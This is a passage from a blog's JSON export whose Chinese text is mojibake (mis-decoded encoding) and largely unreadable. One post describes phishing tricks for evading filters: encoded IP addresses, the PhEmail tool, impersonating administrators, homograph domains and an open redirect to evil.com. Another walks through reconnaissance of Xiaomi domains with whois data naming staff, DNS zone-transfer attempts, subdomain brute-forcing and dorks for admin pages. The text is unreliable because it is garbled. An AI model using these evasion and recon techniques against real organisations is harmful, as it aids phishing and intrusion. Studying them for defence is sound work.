·çš„ç½‘ç«™ã€‚å¸¸è§çš„æœ‰ï¼št.cnã€ bit.lyã€ bit.doã€ u.toã€ url.cn 2. ä½¿ç”¨åå…­è¿›åˆ¶IPåœ°å€ç¼–ç æ ¼å¼è¿›è¡Œæ··æ·†ç½‘ç»œæ”»å‡»è€…æ­£åœ¨ä¸æ–­å‘å±•å…¶å·¥å…·ã€ç­–ç•¥å’ŒæŠ€æœ¯ï¼Œä»¥é€ƒé¿åƒåœ¾é‚®ä»¶æ£€æµ‹ç³»ç»Ÿã€‚ ä¸€äº›åƒåœ¾é‚®ä»¶æ´»åŠ¨éå¸¸ä¾èµ–ç”µå­é‚®ä»¶ä¿¡æ¯ä¸­çš„æ··æ·†URLã€‚å…¶ä¸­å°±æœ‰ä½¿ç”¨äº†URLä¸»æœºåéƒ¨åˆ†ä¸­ä½¿ç”¨çš„åå…­è¿›åˆ¶IPåœ°å€ç¼–ç æ ¼å¼æ¥é€ƒé¿æ£€æµ‹ã€‚ä»æŠ€æœ¯ä¸Šè®²ï¼ŒIPåœ°å€å¯ä»¥ç”¨å¤šç§æ ¼å¼è¡¨ç¤ºï¼Œå› æ­¤å¯ä»¥åœ¨URLä¸­ä½¿ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š https://216.58.199.78 ç‚¹åˆ†åè¿›åˆ¶IPåœ°å€ï¼Œæ­¤ç¤ºä¾‹ä½¿ç”¨Google.comçš„IP https://0330.0072.0307.0116 å…«è¿›åˆ¶IPåœ°å€ï¼Œå°†æ¯ä¸ªåè¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºå…«è¿›åˆ¶ https://0xD83AC74E åå…­è¿›åˆ¶IPåœ°å€ï¼Œå°†æ¯ä¸ªåè¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºåå…­è¿›åˆ¶ https://3627730766 æ•´æ•°æˆ–DWORD IPåœ°å€ï¼Œå°†åå…­è¿›åˆ¶IPè½¬æ¢ä¸ºæ•´æ•° æµè§ˆå™¨å°†è‡ªåŠ¨å°†åå…­è¿›åˆ¶æˆ–å…¶ä»–IPæ ¼å¼è½¬æ¢ä¸ºåè¿›åˆ¶çš„IPåœ°å€ã€‚ 3. é‚®ä»¶é’“é±¼æµ‹è¯•å·¥å…·å›ºæœ‰ç‰¹å¾PhEmailæ˜¯åŸºäºpythonç¼–å†™çš„ä¸€æ¬¾ç½‘ç»œé’“é±¼é‚®ä»¶æµ‹è¯•å·¥å…·ã€‚PhEmailå¯ä»¥åŒæ—¶å‘å¤šä¸ªç”¨æˆ·å‘é€é’“é±¼é‚®ä»¶ï¼Œå¹¶è®°å½•ç‚¹å‡»çš„ç”¨æˆ·çš„é‚®ç®±å’ŒIPç­‰ä¿¡æ¯ã€‚PhEmailå¯ä»¥é€šè¿‡Googleæ”¶é›†é‚®ç®±ï¼Œå®Œæˆé‚®ç®±æ”¶é›†å·¥ä½œã€‚æ”¶é›†é‚®ç®±åé’“é±¼é‚®ä»¶å‘é€å¸¸ç”¨å‚æ•°ï¼š-w é’“é±¼ç½‘ç«™urlåœ°å€ï¼Œå‘é€åä¼šè‡ªåŠ¨æ·»åŠ index.php?email=ç­‰å†…å®¹é’“é±¼é‚®ä»¶ä¸­çš„urlé“¾æ¥ä¼ªé€ æ—¶æ·»åŠ emailåœ°å€å¹¶è¿›è¡Œç¼–ç ï¼Œé€šè¿‡é’“é±¼ç½‘ç«™ä¸­phpæ–‡ä»¶ä»£ç æ¥è¯†åˆ«emailå¹¶è®°å½•logæ–‡ä»¶ä¸­ã€‚phpå¯ä»¥è¿›è¡Œé‡å®šå‘åˆ°å…¶ä»–ç½‘ç«™ã€‚ 4. å†’å……ç®¡ç†å‘˜ç­‰èº«ä»½å¯¹äºä¼ä¸šç”¨æˆ·æ¥è¯´ï¼ŒOAé’“é±¼é‚®ä»¶æ˜¯æœ€å…·å±é™©æ€§çš„é’“é±¼é‚®ä»¶ã€‚æ”»å‡»è€…å†’å……ç³»ç»Ÿç®¡ç†å‘˜å‘é€é‚®ä»¶ï¼Œä»¥é‚®ç®±å‡çº§ã€é‚®ç®±åœç”¨ç­‰ç†ç”±è¯±éª—ä¼ä¸šç”¨æˆ·ç™»å½•é’“é±¼ç½‘ç«™ï¼Œå¹¶è¿›è€Œéª—å–ä¼ä¸šå‘˜å·¥çš„å¸å·ã€å¯†ç ã€å§“åã€èŒåŠ¡ç­‰ä¿¡æ¯ã€‚é’“é±¼é‚®ä»¶ç»å¸¸ä¼ªè£…çš„å‘ä»¶äººèº«ä»½æœ‰ä»¥ä¸‹å‡ ä¸ªä¸»è¦ç±»å‹ï¼š å†’å……ç³»ç»Ÿç®¡ç†å‘˜ï¼Œä»¥ç³»ç»Ÿå‡çº§ã€èº«ä»½éªŒè¯ç­‰ä¸ºç”±ï¼Œé€šè¿‡é’“é±¼ç½‘ç«™ç­‰æ–¹å¼éª—å–ä¼ä¸šå‘˜å·¥çš„å†…ç½‘å¸å·å¯†ç æˆ–é‚®ç®±å¸å·å¯†ç ã€‚ å†’å……ç‰¹å®šç»„ç»‡ï¼Œå¦‚åä¼šã€æœºæ„ã€ä¼šè®®ç»„ç»‡è€…æˆ–æ”¿åºœä¸»ç®¡éƒ¨é—¨ç­‰èº«ä»½å‘é€é‚®ä»¶ï¼Œéª—å–å¸å·å¯†ç æˆ–é’±è´¢ã€‚ å†’å……å®¢æˆ·æˆ–å†’å……è‡ªå·±ï¼Œå³æ”»å‡»è€…ä¼šå†’å……ä¼ä¸šå®¢æˆ·æˆ–åˆä½œæ–¹å¯¹ä¼ä¸šå®æ–½è¯ˆéª—ï¼Œæˆ–è€…æ˜¯æ”»å‡»è€…å†’å……æŸä¼ä¸šå‘˜å·¥å¯¹è¯¥ä¼ä¸šçš„å®¢æˆ·æˆ–åˆä½œæ–¹å®æ–½è¯ˆéª—ã€‚å½“ç„¶ä¹Ÿæœ‰å¯èƒ½ æ˜¯å†’å……æŸä¸ªä¼ä¸šçš„ç®¡ç†è€…å¯¹ä¼ä¸šå‘˜å·¥å®æ–½è¯ˆéª—ã€‚ ä»fromnameï¼ˆå‘ä¿¡äººåç§°ï¼‰ä¸­è·å¾—çš„å¸¸è§åç§°æœ‰ï¼šadminã€supportã€å®‰å…¨ã€serviceã€ç®¡ç†å‘˜ç­‰ã€‚ 5. åŒå½¢å¼‚ä¹‰è¯æ”»å‡»åŒå½¢å¼‚ä¹‰å­—æ˜¯åˆ©ç”¨IDNä¸­ä¸€äº›éæ‹‰ä¸å­—ç¬¦è¯­ç§çš„å­—æ¯ä¸æ‹‰ä¸å­—ç¬¦éå¸¸ç›¸ä¼¼ï¼Œå­—é¢çœ‹å¾ˆéš¾åŒºåˆ†çš„ç‰¹æ€§ï¼Œæ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦æ¥å®ç°é’“é±¼æ”»å‡»ã€‚ä¾‹å¦‚16áƒ•.com(U+10D5)ã€16á€’.com (U+1012)ã€16Ò™.com (U+0499) éƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå’Œ163.comæœ‰ç›¸ä¼¼æ€§ï¼ŒåŸºäºä¸€äº›å¼€æ”¾çš„httpsè¯ä¹¦æœåŠ¡è¿™äº›åŸŸåè¿˜èƒ½å–å¾—ç›¸åº”çš„è¯ä¹¦ï¼Œè¿›ä¸€æ­¥å¢åŠ é’“é±¼æˆåŠŸçš„å¯èƒ½æ€§ã€‚Punycodeæ˜¯RFC 3492æ ‡å‡†è®¾è®¡çš„ç¼–ç ç³»ç»Ÿï¼Œç”¨äºæŠŠUnicodeè½¬æ¢ä¸ºå¯ç”¨çš„DNSç³»ç»Ÿçš„ç¼–ç ï¼Œæ¯”å¦‚16Ò™.comå°±ä¼šè¢«è½¬æˆxnâ€“16-8tc.comï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥é˜²æ­¢IDNæ¬ºéª—ã€‚ 6. URLè·³è½¬ä½¿ç”¨URLè·³è½¬å¯ä»¥çªç ´é’“é±¼è½¯ä»¶æ£€æµ‹ç³»ç»Ÿã€‚è¿™ç±»é’“é±¼è½¯ä»¶æ£€æµ‹ç³»ç»Ÿåœ¨æ£€æµ‹æ˜¯å¦æ˜¯é’“é±¼ç½‘ç«™æˆ–è€…æ¶æ„ç³»ç»Ÿçš„æ—¶å€™ï¼Œæ£€æµ‹çš„æ˜¯URLï¼Œè€Œå¹¶éç½‘ç«™çš„å†…å®¹ã€‚æ¯”å¦‚ï¼Œä»qqé‚®ç®±æ‰“å¼€ä¸€ä¸ªURLçš„æ—¶å€™ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç½‘é¡µæç¤ºã€‚ä½†å¹¶ä¸æ˜¯æ‰€ä»¥çš„ç½‘ç«™éƒ½ä¼šæç¤ºï¼Œä¸€äº›çŸ¥åç½‘ç«™æ˜¯ä¸å¯èƒ½åšé’“é±¼ç½‘ç«™çš„ï¼Œæ‰€ä»¥é‚®ç®±å°±ä¸ä¼šæ‹¦æˆªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“é‚®ç®±ç¢°åˆ°ä¸è®¤è¯†çš„ç½‘ç«™çš„æ—¶å€™æ‰ä¼šè¿›è¡Œæç¤ºã€‚ è¿™æ ·æ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨URLtè·³è½¬æ¥èº²è¿‡æ¶æ„æ£€æµ‹ã€‚æ¯”å¦‚ï¼šhttp://www.baidu.com/page?url=http://www.evil.com å‚è€ƒ2016ä¸­å›½ä¼ä¸šé‚®ç®±å®‰å…¨æ€§ç ”ç©¶æŠ¥å‘Š https://www.anquanke.com/post/id/85416PhEmail https://github.com/Dionach/PhEmailå¾®è½¯ï¼šæœ€æ–°é’“é±¼æŠ€æœ¯2019æ€»ç»“ https://www.4hou.com/posts/A9oz[è¯‘] APTåˆ†ææŠ¥å‘Šï¼š02.é’“é±¼é‚®ä»¶ç½‘å€æ··æ·†URLé€ƒé¿æ£€æµ‹ https://blog.csdn.net/Eastmount/article/details/1087281392017ä¸­å›½ä¼ä¸šé‚®ç®±å®‰å…¨æ€§ ç ”ç©¶æŠ¥å‘Š http://zt.360.cn/1101061855.php?dtid=1101062514&amp;did=491163339åŸºäºURLè·³è½¬ä¸XSSç»„åˆåˆ©ç”¨çš„é’“é±¼åˆ†æ https://xz.aliyun.com/t/6303IDN Spoofæ¼æ´è‡ªåŠ¨åŒ–æŒ–æ˜ https://blog.lyle.ac.cn/2018/12/08/idnfuzz/APTæ‚é¡¹ç¯‡ä¸€ç§è€æ—§ï¼Œä½†å´é˜²ä¸èƒœé˜²çš„é’“é±¼æ”»å‡»ï¼ˆPunycode é’“é±¼æ”»å‡»ï¼‰https://www.codenong.com/cs106406317/é’“é±¼ç½‘ç«™ä¹Ÿåœ¨ä½¿ç”¨httpsåŠ å¯†ï¼Œå¦‚ä½•è¯†åˆ«é’“é±¼ç½‘ç«™ï¼Ÿ https://www.freebuf.com/company-information/208790.htmlæ¶æ„é‚®ä»¶æ™ºèƒ½ç›‘æµ‹ä¸æº¯æºæŠ€æœ¯ç ”ç©¶ https://www.anquanke.com/post/id/172046#h2-0é’“é±¼é‚®ä»¶çš„æŠ•é€’å’Œä¼ªé€  https://xz.aliyun.com/t/6325#toc-0ã€ç”¨æœºå™¨å­¦ä¹ æ£€æµ‹é’“é±¼ç½‘ç«™ http://blog.hubwiz.com/2019/09/17/detect-phishing-url/","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://cool-y.github.io/categories/æ‚ä¸ƒæ‚å…«/"}],"tags":[{"name":"é’“é±¼é‚®ä»¶","slug":"é’“é±¼é‚®ä»¶","permalink":"https://cool-y.github.io/tags/é’“é±¼é‚®ä»¶/"},{"name":"phishing email","slug":"phishing-email","permalink":"https://cool-y.github.io/tags/phishing-email/"}]},{"title":"ã€webã€‘ä¿¡æ¯æ”¶é›†","slug":"web-information-collect","date":"2019-11-12T13:04:37.000Z","updated":"2021-04-10T13:49:16.555Z","comments":true,"path":"2019/11/12/web-information-collect/","link":"","permalink":"https://cool-y.github.io/2019/11/12/web-information-collect/","excerpt":"","text":"ä¿¡æ¯æ”¶é›†+å¸¸è§„owasp top 10+é€»è¾‘æ¼æ´https://www.freebuf.com/sectool/94777.html æµ‹è¯•èŒƒå›´ï¼š.i.mi.com .cloud.mi.com 0x01 ä¿¡æ¯æ”¶é›†https://wh0ale.github.io/2019/02/22/SRC%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/http://www.polaris-lab.com/index.php/archives/69/ åŸŸåä¿¡æ¯æ”¶é›†whoisåæŸ¥å½“ä½ çŸ¥é“ç›®æ ‡çš„åŸŸåï¼Œä½ é¦–å…ˆè¦åšçš„å°±æ˜¯é€šè¿‡Whoistæ•°æ®åº“æŸ¥è¯¢åŸŸåçš„æ³¨å†Œä¿¡æ¯ï¼ŒWhoisæ•°æ®åº“æ˜¯æä¾›åŸŸåçš„æ³¨å†Œäººä¿¡æ¯ï¼ŒåŒ…æ‹¬è”ç³»æ–¹å¼ï¼Œç®¡ç†å‘˜åå­—ï¼Œç®¡ç†å‘˜é‚®ç®±ç­‰ç­‰ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬DNSæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒKaliå·²ç»å®‰è£…äº†Whoisã€‚ä½ åªéœ€è¦è¾“å…¥è¦æŸ¥è¯¢çš„åŸŸåå³å¯ï¼šwhois mi.com123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657root@kali:~# whois mi.comDomain Name: MI.COMRegistry Domain ID: 2502844_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.networksolutions.comRegistrar URL: http://networksolutions.comUpdated Date: 2017-12-20T07:20:54ZCreation Date: 1998-11-06T05:00:00ZRegistrar Registration Expiration Date: 2023-11-05T04:00:00ZRegistrar: NETWORK SOLUTIONS, LLC.Registrar IANA ID: 2Reseller:Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedRegistry Registrant ID:Registrant Name: XIAOMI INCRegistrant Organization: XIAOMI INCRegistrant Street: The Rainbow City Office BuildingRegistrant City: BeijingRegistrant State/Province: BeijingRegistrant Postal Code: 100085Registrant Country: CNRegistrant Phone: +86.13911275905Registrant Phone Ext:Registrant Fax: +86.1060606666Registrant Fax Ext:Registrant Email: dns-admin@xiaomi.comRegistry Admin ID:Admin Name: Ma, HongjieAdmin Organization: XIAOMI INCAdmin Street: The Rainbow City Office BuildingAdmin City: BeijingAdmin State/Province: BeijingAdmin Postal Code: 100085Admin Country: CNAdmin Phone: +86.13911275905Admin Phone Ext:Admin Fax: +86.1060606666Admin Fax Ext:Admin Email: dns-admin@xiaomi.comRegistry Tech ID:Tech Name: Ma, HongjieTech Organization: XIAOMI INCTech Street: The Rainbow City Office BuildingTech City: BeijingTech State/Province: BeijingTech Postal Code: 100085Tech Country: CNTech Phone: +86.13911275905Tech Phone Ext:Tech Fax: +86.1060606666Tech Fax Ext:Tech Email: dns-admin@xiaomi.comName Server: NS3.DNSV5.COMName Server: NS4.DNSV5.COMDNSSEC: unsignedRegistrar Abuse Contact Email: abuse@web.comRegistrar Abuse Contact Phone: +1.8003337680URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/ é™¤äº†ä½¿ç”¨whoiså‘½ä»¤ï¼Œä¹Ÿæœ‰ä¸€äº›ç½‘ç«™æä¾›åœ¨çº¿whoisä¿¡æ¯æŸ¥è¯¢ï¼šwhois.chinaz.com/ç„¶åå¯ä»¥çœ‹åˆ°æ³¨å†Œäººä¿¡æ¯ï¼Œé‚®ç®±ç­‰ç­‰è¿™æ ·æˆ‘ä»¬å¯ä»¥è¿›è¡Œé‚®ç®±åæŸ¥åŸŸåï¼Œçˆ†ç ´é‚®ç®±ï¼Œç¤¾å·¥ï¼ŒåŸŸååŠ«æŒç­‰ç­‰ DNSæœåŠ¡å™¨æŸ¥è¯¢ 1. hoståœ¨kaliä¸‹æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡hostå‘½ä»¤æ¥æŸ¥è¯¢dnsæœåŠ¡å™¨12345root@kali:~# host www.mi.comwww.mi.com is an alias for www.mi.com.wscdns.com.www.mi.com.wscdns.com has address 116.211.251.22www.mi.com.wscdns.com has address 221.235.187.82www.mi.com.wscdns.com has IPv6 address 240e:95e:1001::18 123456DNSæŸ¥è¯¢ï¼šhost -t a domainNamehost -t mx domainNameä¼˜ç‚¹ï¼šéå¸¸ç›´è§‚ï¼Œé€šè¿‡æŸ¥è¯¢DNSæœåŠ¡å™¨çš„Aè®°å½•ã€CNAMEç­‰ï¼Œå¯ä»¥å‡†ç¡®å¾—åˆ°ç›¸å…³ä¿¡æ¯ï¼Œè¾ƒå…¨ã€‚ç¼ºç‚¹ï¼šæœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼Œå¾ˆå¤šDNSæ˜¯ç¦æ­¢æŸ¥è¯¢çš„ã€‚ 2. digé™¤äº†hostå‘½ä»¤ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨digå‘½ä»¤å¯¹DNSæœåŠ¡å™¨è¿›è¡ŒæŒ–æ˜ã€‚ç›¸å¯¹äºhostå‘½ä»¤ï¼Œdigå‘½ä»¤æ›´å…·æœ‰çµæ´»å’Œæ¸…æ™°çš„æ˜¾ç¤ºä¿¡æ¯ã€‚123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354root@kali:~# dig mi.com any; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-3-Debian &lt;&lt;&gt;&gt; mi.com any;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 8930;; flags: qr rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 2, ADDITIONAL: 22;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: b8b49b6c9f27b6bb4704b2375d3bf751d8231fd911f3b57e (good);; QUESTION SECTION:;mi.com. IN ANY;; ANSWER SECTION:mi.com. 600 IN SOA ns3.dnsv5.com. enterprise3dnsadmin.dnspod.com. 1564128772 3600 180 1209600 180mi.com. 600 IN TXT &quot;g5482dbvg8n9bo3vedav36m63q&quot;mi.com. 600 IN TXT &quot;n9rmdqaed6q0502f6t3mfj89i5&quot;mi.com. 600 IN TXT &quot;v=spf1 include:spf_bj.mxmail.xiaomi.com include:spf_hk.mxmail.xiaomi.com ~all&quot;mi.com. 65 IN A 58.83.160.156mi.com. 2841 IN NS ns4.dnsv5.com.mi.com. 2841 IN NS ns3.dnsv5.com.;; AUTHORITY SECTION:mi.com. 2841 IN NS ns3.dnsv5.com.mi.com. 2841 IN NS ns4.dnsv5.com.;; ADDITIONAL SECTION:ns3.dnsv5.com. 12665 IN A 61.151.180.51ns3.dnsv5.com. 12665 IN A 117.135.170.109ns3.dnsv5.com. 12665 IN A 162.14.18.188ns3.dnsv5.com. 12665 IN A 182.140.167.191ns3.dnsv5.com. 12665 IN A 223.166.151.16ns3.dnsv5.com. 12665 IN A 14.215.150.16ns3.dnsv5.com. 12665 IN A 18.194.2.137ns3.dnsv5.com. 12665 IN A 52.77.238.92ns3.dnsv5.com. 12665 IN A 58.251.86.12ns3.dnsv5.com. 12665 IN A 59.36.120.148ns4.dnsv5.com. 129705 IN A 14.215.150.13ns4.dnsv5.com. 129705 IN A 18.235.54.99ns4.dnsv5.com. 129705 IN A 52.198.159.146ns4.dnsv5.com. 129705 IN A 59.36.120.147ns4.dnsv5.com. 129705 IN A 61.151.180.52ns4.dnsv5.com. 129705 IN A 101.226.220.12ns4.dnsv5.com. 129705 IN A 125.39.213.166ns4.dnsv5.com. 129705 IN A 162.14.18.121ns4.dnsv5.com. 129705 IN A 180.163.19.12ns4.dnsv5.com. 129705 IN A 182.254.20.44ns4.dnsv5.com. 129705 IN A 223.166.151.126;; Query time: 1070 msec;; SERVER: 192.168.64.2#53(192.168.64.2);; WHEN: Sat Jul 27 03:03:01 EDT 2019;; MSG SIZE rcvd: 717 3. DNSåŸŸä¼ é€æ¼æ´http://www.lijiejie.com/dns-zone-transfer-2/DNSåŒºåŸŸä¼ é€ï¼ˆDNS zone transferï¼‰æŒ‡çš„æ˜¯ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ä½¿ç”¨æ¥è‡ªä¸»æœåŠ¡å™¨çš„æ•°æ®åˆ·æ–°è‡ªå·±çš„åŸŸï¼ˆzoneï¼‰æ•°æ®åº“ï¼Œç›®çš„æ˜¯ä¸ºäº†åšå†—ä½™å¤‡ä»½ï¼Œé˜²æ­¢ä¸»æœåŠ¡å™¨å‡ºç°æ•…éšœæ—¶ dns è§£æä¸å¯ç”¨ã€‚ç„¶è€Œä¸»æœåŠ¡å™¨å¯¹æ¥è¯·æ±‚çš„å¤‡ç”¨æœåŠ¡å™¨æœªä½œè®¿é—®æ§åˆ¶ï¼ŒéªŒè¯èº«ä»½å°±åšå‡ºç›¸åº”æ•…è€Œå‡ºç°è¿™ä¸ªæ¼æ´ã€‚æ”¶é›†dnsæœåŠ¡å™¨ä¿¡æ¯\\æ‰‹å·¥ä½¿ç”¨nslookupå‘½ä»¤ã€whoisæŸ¥è¯¢ç­‰æ‰‹æ®µè¿›è¡Œå¯¹æŸä¸ªåŸŸåçš„dnsæœåŠ¡å™¨ä¿¡æ¯çš„æ”¶é›†,åˆ©ç”¨ç½‘ç»œç©ºé—´æœç´¢å¼•æ“æ”¶é›†åŸŸåæœåŠ¡å™¨ä¿¡æ¯ã€‚å¦‚ï¼ˆshadonã€zoomeyeã€fofaç­‰ï¼‰,ä½¿ç”¨MASSCAN è¿›è¡Œç«¯å£æ‰«æåï¼Œè·å–å¼€æ”¾53å·ç«¯å£çš„dnsæœåŠ¡å™¨åœ°å€ http://www.freebuf.com/sectool/112583.html123456root@kali:~# dig +short @8.8.8.8 mi.com nsns3.dnsv5.com.ns4.dnsv5.com.root@kali:~# dig +nocmd @ns4.dnsv5.com mi.com axfr;; communications error to 14.215.150.13#53: end of file;; communications error to 14.215.150.13#53: end of file 123456789101112131415161718192021222324C:\\Users\\Administrator&gt;nslookupé»˜è®¤æœåŠ¡å™¨: XiaoQiangAddress: 192.168.31.1&gt; server ns4.dnsv5.comé»˜è®¤æœåŠ¡å™¨: ns4.dnsv5.comAddresses: 182.254.20.44 180.163.19.12 18.235.54.99 162.14.18.121 61.151.180.52 52.198.159.146 59.36.120.147 223.166.151.126 14.215.150.13 101.226.220.12 125.39.213.166&gt; ls mi.comls: connect: No error*** æ— æ³•åˆ—å‡ºåŸŸ mi.com: Unspecified errorDNS æœåŠ¡å™¨æ‹’ç»å°†åŒºåŸŸ mi.com ä¼ é€åˆ°ä½ çš„è®¡ç®—æœºã€‚å¦‚æœè¿™ä¸æ­£ç¡®ï¼Œè¯·æ£€æŸ¥ IP åœ°å€ 182.254.20.44 çš„ DNS æœåŠ¡å™¨ä¸Š mi.com çš„åŒºåŸŸä¼ é€å®‰å…¨è®¾ç½®ã€‚ å­åŸŸåhttps://github.com/ring04h/wydomainåœ¨æ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œå¾€å¾€ä¸»ç«™çš„é˜²å¾¡ä¼šå¾ˆå¼ºï¼Œå¸¸å¸¸æ— ä»ä¸‹æ‰‹ï¼Œé‚£ä¹ˆå­ç«™å°±æ˜¯ä¸€ä¸ªé‡è¦çš„çªç ´å£ï¼Œå› æ­¤å­åŸŸåæ˜¯æ¸—é€æµ‹è¯•çš„ä¸»è¦å…³æ³¨å¯¹è±¡ï¼Œå­åŸŸåæœé›†çš„è¶Šå®Œæ•´ï¼Œé‚£ä¹ˆæŒ–åˆ°çš„æ¼æ´å°±å¯èƒ½æ›´å¤šï¼Œç”šè‡³æ¼æ´çš„çº§åˆ«ä¹Ÿä¼šæ›´é«˜ã€‚å¸¸ç”¨çš„å·¥å…·æœ‰ä¸‹é¢è¿™äº›ï¼š1. å­åŸŸåæŒ–æ˜æœºLayer åŸŸå è§£æIP å¼€æ”¾ç«¯å£ WEBæœåŠ¡å™¨ ç½‘ç«™çŠ¶æ€ cn.i.mi.com 120.92.65.26 80,443 - 80:(405) ä¸å…è®¸çš„æ–¹æ³• daily.i.mi.com 10.108.230.153 - ç«¯å£æœªå¼€æ”¾ ç«¯å£æœªå¼€æ”¾ in.i.mi.com 104.211.73.78 80,443 Tengine 80:(405) ä¸å…è®¸çš„æ–¹æ³• us.i.mi.com 54.148.120.178,35.162.30.45 80,443 Tengine 80:(405) ä¸å…è®¸çš„æ–¹æ³• 2. subdomain lijiejieçš„å­åŸŸåæ”¶é›†å·¥å…·https://github.com/lijiejie/subDomainsBrute1234567891011121314151617$ python subDomainsBrute.py -t 10 i.mi.com SubDomainsBrute v1.2 https://github.com/lijiejie/subDomainsBrute[+] Validate DNS servers [+] Server 182.254.116.116 &lt; OK &gt; Found 4 [+] 4 DNS Servers found [+] Run wildcard test[+] Start 6 scan process[+] Please wait while scanning ...All Done. 4 found, 16185 scanned in 74.0 seconds. Output file is i.mi.com.txtcn.i.mi.com 120.92.65.26daily.i.mi.com 10.108.230.153in.i.mi.com 104.211.73.78us.i.mi.com 35.162.30.45, 54.148.120.178 3. google hackinghttps://github.com/K0rz3n/GoogleHacking-Page æœé›†åŸŸåå’Œmailåœ°å€ï¼š æœé›†æ•æ„Ÿæ–‡ä»¶ï¼šsite:xxx.com filetype:doc|mdb|ini|php|asp|jsp æœé›†ç®¡ç†åå°ï¼šsite:xxx.com ç®¡ç†ï¼site:xxx.com adminï¼site:xxx.com login æœé›†mailï¼šsite:xxx.com intext:@xxx.comï¼intext:@xxx.com æœé›†æ•æ„Ÿwebè·¯å¾„ï¼šsite:xxx.com intitle:ç™»å½•ï¼site:xxx.com inurl:sql.php æ‰¹é‡æŸ¥æ‰¾å­¦æ ¡ç½‘ç«™çš„åå° è¾“å…¥å¦‚ä¸‹å…³é”®å­—1234567891011121314151617181920212223242526272829303132site:hdu.edu.cn intext:ç®¡ç†|åå°|ç™»å½•|ç”¨æˆ·å|å¯†ç |éªŒè¯ç |ç³»ç»Ÿ|è´¦å·|åå°ç®¡ç†|åå°ç™»å½•intext: æŠŠç½‘é¡µä¸­çš„æ­£æ–‡å†…å®¹ä¸­çš„æŸä¸ªå­—ç¬¦åšä¸ºæœç´¢æ¡ä»¶.ä¾‹å¦‚åœ¨googleé‡Œè¾“å…¥:intext:æ­ç”µ.å°†è¿”å›æ‰€æœ‰åœ¨ç½‘é¡µæ­£æ–‡éƒ¨åˆ†åŒ…å«â€æ­ç”µâ€çš„ç½‘é¡µallintext:ä½¿ç”¨æ–¹æ³•å’Œintextç±»ä¼¼.intitle: æœç´¢ç½‘é¡µæ ‡é¢˜ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬æ‰€è¦æ‰¾çš„å­—ç¬¦.ä¾‹å¦‚æœç´¢:intitle:æ­ç”µ.å°†è¿”å›æ‰€æœ‰ç½‘é¡µæ ‡é¢˜ä¸­åŒ…å«â€æ­ç”µâ€çš„ç½‘é¡µ.åŒç†allintitle:ä¹ŸåŒintitleç±»ä¼¼.cache: æœç´¢googleé‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜,æœ‰æ—¶å€™å¾€å¾€èƒ½æ‰¾åˆ°ä¸€äº›å¥½ä¸œè¥¿.define: æœç´¢æŸä¸ªè¯çš„å®šä¹‰,ä¾‹å¦‚æœç´¢:define:æ­ç”µ,å°†è¿”å›å…³äºâ€œæ­ç”µâ€çš„å®šä¹‰.filetype: æœç´¢åˆ¶å®šç±»å‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šfiletype:doc.å°†è¿”å›æ‰€æœ‰ä»¥docç»“å°¾çš„æ–‡ä»¶URL.info: æŸ¥æ‰¾æŒ‡å®šç«™ç‚¹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯.inurl: æœç´¢æˆ‘ä»¬æŒ‡å®šçš„å­—ç¬¦æ˜¯å¦å­˜åœ¨äºURLä¸­.ä¾‹å¦‚è¾“å…¥:inurl:admin,å°†è¿”å›Nä¸ªç±»ä¼¼äºè¿™æ ·çš„è¿æ¥:http://xxx/admin,å¸¸ç”¨äºæŸ¥æ‰¾é€šç”¨æ¼æ´ã€æ³¨å…¥ç‚¹ã€ç®¡ç†å‘˜ç™»å½•çš„URLallinurl:ä¹ŸåŒinurlç±»ä¼¼,å¯æŒ‡å®šå¤šä¸ªå­—ç¬¦.linkurl: ä¾‹å¦‚æœç´¢:inurl:hdu.edu.cnå¯ä»¥è¿”å›æ‰€æœ‰å’Œhdu.edu.cnåšäº†é“¾æ¥çš„URL.site: æœç´¢æŒ‡å®šåŸŸå,å¦‚site:hdu.edu.cn.å°†è¿”å›æ‰€æœ‰å’Œhdu.edu.cnæœ‰å…³çš„URL. 4. çˆ¬è™«ä¸€äº›ç½‘ç«™é‡Œé¢çš„è·³è½¬è¯·æ±‚ï¼ˆä¹Ÿå¯ä»¥å…³æ³¨ä¸€ä¸‹appï¼‰è¿˜æœ‰å°±æ˜¯ç™¾åº¦ï¼Œæœ‰äº›ä¼šåœ¨title å’Œ copyrightä¿¡æ¯é‡Œé¢å‡ºç°è¯¥å…¬å¸çš„ä¿¡æ¯ç½‘ç«™htmlæºç ï¼šä¸»è¦å°±æ˜¯ä¸€äº›å›¾ç‰‡ã€jsã€cssç­‰ï¼Œä¹Ÿä¼šå‡ºç°ä¸€äº›åŸŸåapkåç¼–è¯‘æºç é‡Œé¢ 